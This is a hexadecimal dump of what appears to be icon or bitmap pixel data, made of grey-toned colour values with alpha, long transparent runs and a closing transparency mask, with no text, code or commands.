          B1AFAEFFB1AFADFFB1AFADFFB1AFADFFB1AFADFFB1AFADFFB1AFADFFB1AFADFF
          BEBCBBFCDDDBDB8ED1CFCE150000000000000000000000000000000000000000
          C4C2C116827F7E909B9997FCB1AFADFFB1AFADFFB1AFADFFB1AFADFFB1AFADFF
          B1AFADFFB1AFADFFB1AFAEFFABA9A8FF767473FFBAB8B7FFBEBCBBFFC2C0BEFF
          C6C4C3FFCAC8C7FFCDCCCAFFD1D0CEFFD5D3D2FFB1AFAFE17674743E00000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000007F7C7B52928F8EE29F9D9CFFA4A2A1FFA9A7A6FFAFADABFF
          B4B2B1FFB9B7B6FFBFBDBBFFC4C2C1FFC9C7C6FFBBBAB8FF6B6969FFB1AFADFF
          ACA9A8FFACA9A8FFACA9A8FFACA9A8FFACA9A8FFACA9A8FFACA9A8FF918E8DF4
          93908F4600000000000000000000000000000000000000000000000000000000
          000000000000000063626149908D8CF5ACA9A8FFACA9A8FFACA9A8FFACA9A8FF
          ACA9A8FFACA9A8FFACA9A8FFB1AFADFF777573FFB1AFADFFC2C0BEFFC6C4C3FF
          CAC8C7FFCDCCCBFFD1D0CEFFCECCCBFF999796AA605E5D110000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000008381800C92908F89A3A1A0FAAFADACFFB4B2B1FF
          B9B8B6FFBFBDBBFFC4C2C1FFC9C7C6FFCECDCBFF999796FF93908FFFA9A7A5FF
          A9A6A5FFA9A6A5FFA9A6A5FFA9A6A5FFA9A6A5FFA9A6A5FF93908FFE5856564F
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000063616054989594FFA9A6A5FFA9A6A5FFA9A6A5FF
          A9A6A5FFA9A6A5FFA9A6A5FFAAA7A6FF959391FF939190FFC6C4C3FFCAC8C7FF
          CDCCCBFFD1D0CEFFBCBAB9F48684846300000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000008886842B9E9B9AC0B6B4B3FF
          BFBDBBFFC4C2C1FFC9C7C6FFCECDCCFFD4D2D1FF838180FFAAA8A6FFADABA9FF
          ADABA9FFADABA9FFADABA9FFADABA9FFADABA9FFADAAA9FF676464A800000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000747270ADADAAA9FFADABA9FFADABA9FF
          ADABA9FFADABA9FFADABA9FFADABA9FFA9A7A6FF7B7978FFCAC8C7FFCECCCBFF
          D1D0CEFFBBB9B8FF6A67675D0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000000000000088848301918E8D5D
          AFADABE8C9C7C6FFCECDCCFFD4D2D1FFD7D5D5FF807D7CFFB1AEADFFB2B0AFFF
          B2B0AFFFB2B0AFFFB2B0AFFFB2B0AFFFB2B0AFFF9B9998FF5250503400000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000005F5E5D399E9C9BFFB2B0AFFFB2B0AFFF
          B2B0AFFFB2B0AFFFB2B0AFFFB2B0AFFFB1AEADFF737170FFCDCCCAFFD1D0CEFF
          D5D3D3FFC5C3C3FF696766740000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          78767593CBC9C8FFD4D2D1FFD8D6D6FFD1CFCFFF898685FFB3B1AFFFB7B5B3FF
          B7B5B3FFB7B5B3FFB7B5B3FFB7B5B3FFB7B5B3FF918F8EE76968670100000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000006B6969028E8C8AEBB7B5B3FFB7B5B3FF
          B7B5B3FFB7B5B3FFB7B5B3FFB7B5B3FFB3B1AFFF7E7B7AFFCBC9C8FFD5D3D3FF
          D9D7D7FFD5D4D4FF6E6B6A8F0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          787674A1D3D1D0FFD8D6D6FFD7D5D5FFCAC8C7FF918F8EFFB6B4B3FFBDBBB9FF
          BDBBB9FFBDBBB9FFBDBBB9FFBDBBB9FFBDBBB9FF9A9896C10000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000999695C5BDBBB9FFBDBBB9FF
          BDBBB9FFBDBBB9FFBDBBB9FFBDBBB9FFB6B4B3FF959392FFC9C7C6FFD9D7D7FF
          DDDBDBFFDFDDDDFF7472709D0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          767373A3D7D5D5FFD7D5D5FFD4D3D2FFC8C7C5FF969493FFB9B7B6FFC2C0BEFF
          C2C0BEFFC2C0BEFFC2C0BEFFC2C0BEFFC2C0BEFFA8A5A4BD0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000D0CECDC0C2C0BEFFC2C0BEFF
          C2C0BEFFC2C0BEFFC2C0BEFFC2C0BEFFB9B7B5FFBFBDBCFFD1D0CFFFDDDBDBFF
          E0DFDFFFE3E1E1FF7A78769F0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          6F6D6C98D4D2D2FFD4D3D2FFD1D0CEFFCAC8C7FF9A9897FFBAB8B6FFC7C5C4FF
          C7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFB4B2B1DA0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000D1D0CFDEC7C5C4FFC7C5C4FF
          C7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFB9B7B6FFDDDBDBFFDEDCDCFFE0DFDFFF
          E4E3E3FFE4E2E2FF7D7A79940000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          6B696881C7C6C4FFD1D0CEFFCFCDCCFFCBC9C8FFA19E9DFFB6B4B3FFCCCBC9FF
          CCCBC9FFCCCBC9FFCCCBC9FFCCCBC9FFCCCBC9FFC2C1BFFDA9A6A41D00000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000A6A3A120C6C5C3FECCCBC9FFCCCBC9FF
          CCCBC9FFCCCBC9FFCCCBC9FFCCCBC9FFB5B3B2FFDAD9D8FFE1E0DFFFE4E3E3FF
          E8E7E7FFE9E7E7FFB1AFAEC58C8A881E00000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          6865655DB7B5B4FFCECDCCFFCCCAC9FFC9C7C6FFACAAA9FFACAAA8FFD1D0CEFF
          D1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD0CFCDFFB9B7B58300000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000095939187D0CECDFFD1D0CEFFD1D0CEFF
          D1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFADABA9FFD7D5D4FFE4E3E3FFE8E7E7FF
          ECEAEAFFE9E8E8FFE2E1E1FFC9C7C6F3A5A3A1768B8887050000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000000000007371702D
          A8A6A5D6CECDCBFFCCCAC9FFC9C7C6FFC6C4C3FFB7B5B4FFA09D9CFFD4D2D1FF
          D5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFC9C7C6F5B3B1AF26
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000A2A09E28BBB9B8F6D5D3D2FFD5D3D2FFD5D3D2FF
          D5D3D2FFD5D3D2FFD5D3D2FFD4D2D1FFA4A1A0FFD3D2D1FFE8E7E7FFECEAEAFF
          E9E8E8FFE2E1E1FFDBDADAFFD5D3D2FFCCCBC9FFB2AFAED49C99973F00000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000000000000084828164BBB9B8F6
          CECDCCFFCCCAC9FFC9C7C6FFC6C4C3FFC3C1C0FFBDBBBAFFA3A1A0FFC0BEBDFF
          D2D1CFFFD2D1CFFFD2D1CFFFD2D1CFFFD2D1CFFFD2D1CFFFD2D0CFFFC0BEBCD7
          AAA8A61900000000000000000000000000000000000000000000000000000000
          0000000000000000C3C1C01BC1BFBDD9D2D0CFFFD2D1CFFFD2D1CFFFD2D1CFFF
          D2D1CFFFD2D1CFFFD2D1CFFFBFBDBCFF9E9C9BFFDDDBDBFFECEAEAFFE9E8E8FF
          E2E1E1FFDBDADAFFD4D3D2FFCDCCCAFFC6C5C3FFC0BEBCFFB5B3B1FEA5A3A1A2
          9C98971700000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000006462610D969493A5C9C8C6FFCECDCCFF
          CCCAC9FFC9C7C6FFC6C4C3FFC3C1C0FFC0BEBCFFBDBBBAFFB3B1AFFFA3A09FFF
          CDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFFCCCBC9FF
          BAB8B6E29C9A9846000000000000000000000000000000000000000000000000
          00000000E9E7E749D4D2D2E3CDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFFCDCBCAFF
          CDCBCAFFCDCBCAFFCDCBCAFF9F9C9BFFA19E9DFFECEAEAFFE9E8E8FFE2E1E1FF
          DBDAD9FFD4D3D2FFCDCCCAFFC6C5C3FFBFBDBCFFB8B6B5FFB1AFAEFFAAA8A6FF
          A19E9DC200000000000000000000000000000000000000000000000000000000
          00000000000000000000000072706F30AAA8A7D9D1CFCEFFCECDCCFFCCCAC9FF
          C9C7C6FFC6C4C3FFC3C1C0FFC0BEBCFFBDBBBAFFBAB8B7FFB8B6B5FFA09D9CFF
          B9B7B5FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FF
          C6C4C3FFBBB9B8FF9E9C9BC57976756F5856563D4E4D4D2C4E4C4C3E605E5D70
          999796C7C8C7C5FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FFC6C4C3FF
          C6C4C3FFC6C4C3FFB8B6B4FF868483FFC3C2C1FFE9E8E7FFE2E1E0FFDBDAD9FF
          D4D3D2FFCDCCCAFFC6C4C3FFBFBDBCFFB8B6B5FFB1AFAEFFAAA8A7FFA3A1A0FF
          A09D9C7000000000000000000000000000000000000000000000000000000000
          0000000000000000615F5F2B8D8C8BF7D1D0CEFFCECDCCFFCCCAC9FFC9C7C6FF
          C6C4C3FFC3C1BFFFC0BEBCFFBDBBBAFFBAB8B6FFB7B5B4FFB5B3B1FFB5B3B1FF
          979593FFBDBBB9FFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFF
          BEBCBAFFBEBCBAFFBEBCBAFFBBB9B7FFAAA8A6FFA09E9DFFA7A5A4FFBAB8B6FF
          BEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFFBEBCBAFF
          BEBCBAFFBCBAB9FF93908FFF9D9B9AFFE7E6E6FFE2E1E0FFDBD9D9FFD4D3D2FF
          CDCCCAFFC6C4C3FFBFBDBCFFB8B6B5FFB1AFAEFFAAA8A7FFA3A1A0FF9C9998FA
          9996951600000000000000000000000000000000000000000000000000000000
          00000000000000005F5D5D04626060DDC6C5C3FFCCCAC9FFC9C7C6FFC6C4C3FF
          C3C1BFFFC0BEBCFFBDBBBAFFBAB8B6FFB7B5B4FFB5B3B1FFB2B0AEFFB2B0AEFF
          AAA8A6FF999795FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FF
          B4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FF
          B4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FF
          B4B2B1FF989695FF9A9897FFD6D5D4FFE2E1E0FFDBD9D9FFD4D2D1FFCDCCCAFF
          C6C4C3FFBFBDBCFFB8B6B4FFB1AFAEFFAAA8A7FFA3A1A0FF9C9998FF969392B1
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000005957566A93908FFFC9C7C6FFC6C4C3FFC3C1BFFF
          C0BEBCFFBDBBBAFFBAB8B6FFB7B5B4FFB5B3B1FFB2B0AEFFAFADABFFACAAA8FF
          B0AEADFF9E9B9AFF979493FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FF
          A9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FF
          A9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FFA9A7A6FF
          979493FF9E9C9BFFCCCAC9FFE2E1E0FFDBD9D9FFD4D2D1FFCDCBCAFFC6C4C3FF
          BFBDBBFFB8B6B4FFB1AFAEFFAAA8A6FFA3A1A0FF9C9998FF949190FF8F8C8B51
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000005A58580A5E5C5CE9C1C0BEFFC3C1BFFFC0BEBCFF
          BDBBBAFFBAB8B6FFB7B5B4FFB5B3B1FFB2B0AEFFAFADABFFACAAA8FFA9A7A5FF
          A6A4A2FFADABAAFF989594FF8E8B8AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF
          9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF
          9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF9E9B9AFF8E8B8AFF
          A7A4A3FFCFCDCCFFE2E0E0FFDBD9D9FFD4D2D1FFCDCBCAFFBEBCBBFFBAB8B6FF
          B7B5B4FFB1AFAEFFAAA8A6FFA3A19FFF9C9998FF959291FF8C8988EB87858306
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000514F4F7C939190FFC0BEBCFFBDBBBAFF
          BAB8B6FFB7B5B4FFB5B2B1FFB2B0AEFFAFACABFFAAA7A6FFA9A7A5FFA6A4A2FF
          A3A1A0FFA19E9DFFA8A5A4FF999695FF83807FFF8F8C8BFF918F8EFF918F8EFF
          918F8EFF918F8EFF918F8EFF918F8EFF918F8EFF918F8EFF918F8EFF918F8EFF
          918F8EFF918F8EFF918F8EFF918F8EFF918F8EFF8F8C8BFF878584FFBCBABAFF
          DBD9D9FFE2E0E0FFDBD9D9FFD4D2D1FFCDCBCAFFBDBAB9FF9E9B9A8B9A96951A
          9A9796429E9B99699B989791969493B9928F8EE18B8988FD8583829200000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000055535312636161F3BCBAB8FFBAB8B6FF
          B7B5B3FFA7A5A3FF979494DF8C8A89A27B7877666E6B6BBF9E9C9AFFA3A1A0FF
          A19E9DFF9F9C9BFFA09E9DFFA6A4A2FF9C9A99FF817E7DFF7D7B79FF83807FFF
          838180FF838180FF838180FF838180FF838180FF838180FF838180FF838180FF
          838180FF838180FF838180FF83807FFF7D7B7AFFA09F9DFFE0DFDFFFE6E4E4FF
          E2E0E0FFDBD9D9FFD4D2D1FFCDCBCAFFC0BEBDFF9E9B9ABC9D9B980500000000
          000000000000000000000000000000000000000083807F0C83807F0D00000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000005A58578B868483D08B898794
          716F6E586260601C0000000000000000000000006B696810757271CF9B9897FF
          9F9C9BFFA19E9DFFA4A2A1FFA8A6A4FFABA9A7FFA3A09FFF898786FF787574FF
          747170FF757271FF757271FF757271FF757271FF757271FF757271FF757271FF
          757271FF757271FF73706FFF767372FFA09E9DFFEAE9E9FFE9E8E8FFE2E0E0FF
          DBD9D9FFD4D2D1FFCDCBCAFFC0BEBDFF9B9897CC9692910F0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000006F6C6B12797675C7
          999695FFA4A2A1FFA8A6A4FFACAAA8FFB0AEACFFB4B2B0FFB3B1AFFFA09E9CFF
          838180FF6E6B6BFF686565FF666362FF656362FF666463FF656362FF63605FFF
          5E5C5BFF5A5858FF726F6FFFADABAAFFE2E0E0FFE9E7E7FFE2E0E0FFDAD9D9FF
          D4D2D1FFCDCBCAFFBDBBB9FF989695C48B898811000000000000000000000000
          000000000000000000000000000000000000000000000000565555035F5F5E01
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000000000007573720A
          7D7A79A3989694FFACAAA8FFB0AEACFFB4B2B0FFB7B5B4FFBBB9B8FFBFBDBBFF
          C3C1BFFFBBB9B8FFA7A4A4FF939190FF828180FF7F7D7DFF858383FF949292FF
          ADACACFFD1CFCFFFE9E7E7FFECEBEAFFE8E7E7FFE1E0E0FFDAD9D9FFD4D2D1FF
          CDCBCAFFC6C4C2FFACAAA8EC8D8A8A0800000000000000000000000000000000
          00000000000000000000000000000000615F5E4E6D6B6ABE797776F17876754B
          0000000000000000000000000000000065636208000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000918E8D9FB0AEACFFB4B2B0FFB7B5B4FFBBB9B8FFBFBDBBFFC3C1BFFF
          C7C5C4FFCBC9C8FFCECDCBFFD2D1CFFFD6D4D3FFDAD8D8FFDDDCDCFFE1E0E0FF
          E5E4E3FFE9E7E7FFECEBEAFFE8E7E7FFE1E0E0FFDAD9D9FFD4D2D1FFCDCBCAFF
          C6C4C2FFBFBDBBFFAFADACFE8582811A00000000000000000000000000000000
          000000000000000000000000000000007F7D7C84928F8EFF9D9B99FF9A9796C0
          000000000000000000000000AFADAC70B1AFAEE6868482560000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000009E9C9BACB4B2B0FFB7B5B4FFBBB9B8FFBFBDBBFFC3C1C0FFC7C5C4FF
          CBC9C8FFCECDCBFFD2D1CFFFD6D4D3FFDAD8D8FFDDDCDCFFE1E0E0FFE5E4E3FF
          E9E7E7FFECEBEAFFE8E7E7FFE1E0E0FFDAD9D9FFD3D2D1FFCCCBCAFFC5C4C2FF
          BFBDBBFFB8B6B4FFB0AEADFF8986855700000000000000000000000000000000
          000000000000000000000000000000008F8C8B80A4A1A0FFAFACABFFB8B6B5FF
          A4A2A19CA19E9D70B0ADAC7AD1CFCEFECDCCCAFFC0BEBDFF8F8D8C4300000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000A5A3A2D4B8B6B4FFBBB9B8FFBFBDBBFFC3C1C0FFC7C5C4FFCBC9C8FF
          CECDCBFFD2D1CFFFD6D4D4FFDAD8D8FFDDDCDCFFE1E0E0FFE5E4E4FFE9E7E7FF
          ECEBEAFFE8E7E7FFE1E0E0FFDAD9D8FFD3D2D1FFCCCBC9FFC5C4C2FFBFBDBBFF
          B7B5B4FFB1AEADFFA9A7A6FF8E8C8A950000000000000000000000006A686807
          737170577472710B00000000807D7C3A9E9C9BD6B5B3B1FFC0BEBDFFCBC9C8FF
          D4D2D2FFD5D3D3FFD0CECDFFCAC8C7FFC4C2C0FFB7B5B4EA8683820600000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          92908D05ADABA9F9BBB9B8FFBFBDBBFFC3C1C0FFC7C5C4FFCBC9C8FFCECDCBFF
          D2D1CFFFD6D4D4FFDAD8D8FFBBB9B8FAB9B7B6FFBAB9B8FFB9B6B6FFB3B0AFF5
          A8A6A5D8B8B6B6DCDAD9D8FFD3D2D1FFCCCBC9FFC5C3C2FFBEBCBBFFB7B5B4FF
          B0AEADFFA9A7A6FFA2A09FFF8D8A89D200000000000000000000000078767581
          8F8C8BFF979493F29A9897AFAAA8A7FBB7B5B3FFC6C5C3FFCCCBC9FFC5C4C2FF
          C0BEBCFFC5C3C2FFCFCDCCFFC1BFBEFFBAB8B6FFA6A3A29A0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          93908F27B7B5B3FFBFBDBCFFC3C1C0FFC7C5C4FFCBC9C8FFCECDCCFFD2D1CFFF
          D6D4D4FFDAD8D8FFC8C6C6E39A97950F9A97950A9593920F95919009938F8E01
          000000008C8A881BBEBCBBEACCCBC9FFC5C3C2FFBEBCBBFFB7B5B4FFB0AEADFF
          A9A7A6FFA2A09FFF9B9998FF8C8988FD67656413000000007D7A7919918E8DF9
          A19E9DFFACA9A8FFB7B5B3FFADABAAFF999695FFB2B0AEFFB9B7B6FFC1BFBEFF
          C9C7C6FFD1CFCEFFD8D7D6FFC2C1C0FFAAA7A6FFA09D9CEF7774732300000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          A09D9C4FBFBDBBFFC3C1C0FFC7C5C4FFCBC9C8FFCECDCCFFD2D1CFFFD6D4D4FF
          DAD8D8FFD8D6D6FFA7A5A4520000000000000000000000000000000000000000
          0000000000000000928F8E4ABDBBB9FEBEBCBBFFB7B5B4FFB0AEADFFA9A7A6FF
          A2A09FFF9B9998FF949291FF8C8988FF6764644E00000000000000009A989671
          B1AFADFEBDBBBAFFBEBCBBFF979594FFB1AFADFFABA9A7FFADABA9FFB5B3B1FF
          BDBBB9FFC4C3C1FFCCCBC9FFD4D2D1FFA4A2A1FFA09E9CFF93908FC59B999877
          9E9C9A7C7977763D000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          ABA9A778C3C1C0FFC7C5C4FFCBC9C8FFCFCDCCFFD2D1CFFFD6D4D4FFDAD8D8FF
          DDDCDCFFBBB9B8B2000000000000000000000000000000000000000000000000
          000000000000000000000000918F8E8DB6B4B2FFB0AEADFFA9A7A5FFA2A09FFF
          9B9997FF93908FFF7C7A79FF656362F65D5B5B5A000000000000000000000000
          A5A3A286CFCDCCFFA7A5A4FFC2C0BFFFBDBBBAFFB1AFADFEA2A09F94BBB9B838
          A19F9E41BCBAB8AFBFBDBCFFC8C6C5FFCCCAC9FF959392FFADABA9FFB5B3B1FF
          BDBBB9FF8E8C8BA5000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          A19F9D85ACAAA9FEBCB9B8FFCDCBCAFFD2D1CFFFD6D4D4FFDAD8D8FFDDDCDCFF
          CECCCCF493908F1F000000000000000000000000000000000000000000000000
          000000000000000000000000716F6E06949190CAA9A7A5FFA2A09EFF989594FF
          7C7A79FF636160EC5C5A5A825D5B5B1600000000000000000000000000000000
          AAA8A792D5D3D3FFAEACABFFD1CFCEFFC9C8C6FF9C9A998D0000000000000000
          000000007A7876029D9B9AB8BBB9B8FFC3C1C0FFA4A2A1FFBAB8B6FFC2C0BEFF
          CAC8C7FFA2A0A0DD000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000009E9B9A279C9997839B9997DFADABAAFFC7C5C5FFDDDCDCFFDFDEDEFF
          A8A5A57400000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000006C6A69238D8B8AF07A7877FF615F5EDC
          5C5A5A6B5D5B5B0B0000000000000000000000000000000000000000706E6E09
          B3B1B0C4CAC9C7FFB2B0AEFFD0CFCDFFD2D0CFFF9D9B992B0000000000000000
          000000000000000088868458AFADABFFB7B5B3FFA4A2A0FFC6C5C3FFCCCBC9FF
          BFBDBCC2A09E9D54000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000094908F02908D8C3F8C89889C939190F0A4A2A1D0
          83817F0500000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000005E5C5C4C5C5A5A555C5A5A03
          00000000000000000000000000000000000000006361610BADABAA7FC2C1BFEA
          C9C8C6FFC2C0BFFFA9A7A5FFC1BFBEFFCBCAC8FFB7B5B4310000000000000000
          0000000000000000B1AFAD5DACAAA8FFABA9A8FFA4A2A1FFD3D1D0FFA7A5A48D
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000000000000083818009817E7D1A
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000005D5B5A11AFADACFDC6C4C3FF
          C0BEBCFFBAB8B6FFA19F9DFFAAA8A7FFBAB8B6FFBBB9B7A10000000000000000
          0000000099969606B8B6B5C7B8B6B4FFB0AEACFFC9C7C6FFE0DEDEFFA19F9E5F
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000979594D5BCBAB9FF
          B6B4B2FFB0AEADFFA5A3A2FF8D8B89FFA19E9DFFB0AEADFFA8A5A4B18E8C8A56
          B8B6B55FCECDCCC8CBCAC9FFC4C2C1FFB7B5B4FFDCDADAFFE8E7E6FFB5B3B368
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000007F7D7C3E9B999856
          97959452959391CFA2A09EFF8D8A89FF827F7EFF969392FFA8A6A4FFB7B5B4FF
          C4C3C1FFCECDCBFFD3D1D0FFCBC9C8FFB4B2B1FFE5E4E4FFD9D7D6FFC8C6C5FC
          ADAAA96400000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000007F7C7B329F9C9BF6ACAAA8FF868382FF777574FF8B8887FF9E9B9AFF
          AFADABFFBDBBBAFFBDBCBAFFBDBBBAFFDAD9D8FFD0CECDFFC1C0BEFFB3B1AFFF
          A5A3A1DBA5A1A004000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000086838201ABA9A8D3BAB8B7FFC1BFBEFFA6A4A3FF838180FF7D7B7AFF
          8E8B8AFFBFBEBDFFDCDADAFFD6D5D4FFBFBEBCE3B5B3B19EA9A6A5F29B9897FE
          9491904300000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000A8A6A438BEBDBBFFC7C5C4FFCFCDCCFFD5D4D3FFDFDDDDFFE7E5E5FF
          E8E6E6FFDCDBDAFFCECCCBFFB1AFAEAE98959414000000008F8C8B0C88858445
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000AEACAA75C7C5C4FFD4D2D1FFD4D3D2EEB4B2B047B4B2B15CC2C0BF95
          D4D2D1FFC5C3C2FFB6B4B3FF9C99985B00000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000A19E9D55BEBDBCD7BBBAB936000000000000000086838303
          B2B0AFDDAEACAAFF9F9D9BFF8885846000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000008583820100000000000000000000000000000000
          8885846982807FC47371708D6563622800000000000000000000000000000000
          0000000000000000FFFFFFFFFFFFFFFFFFFFCFFF87FFFFFFFFFE07FF00FFFFFF
          FFF807FE007FFFFFFFF003FE007FFFFFFFF001FC007FFFFFFFF000F8007FFFFF
          FFF8000000FFFFFFFFF8000000FFFFFFFFF8000000FFFFFFFFF8000000FFFFFF
          FFFC0000007FFFFFFFF00000001FFFFFFFE00000000E0FFFFFE0000000000FFF
          C0C00000000007FF80000000000007FF80000000000003FF80000000000003FF
          00000000000001FF00000000000001FF0000007C000007FF000001FF00000FFF
          800003FF80003FFFE00007FFC0007FFFF00007FFC0007FFFFC0007FFC0007FFF
          FC000FFFE0007FFFFC000FFFE0007FFFFC000FFFE0007FFFFC0007FFC0003FFF
          FC0007FFC0000FFFF80003FF800007FFF00001FF000001FFC00000FE000001FF
          80000000000001FF00000000000001FF00000000000003FF80000000000003FF
          80000000000003FFC0000000000007FFC00000000007E7FFE0E00000000FFFFF
          FFF00000001FF3FFFFF80000003FC3DFFFFE0000003FC38FFFFE0000003FC007
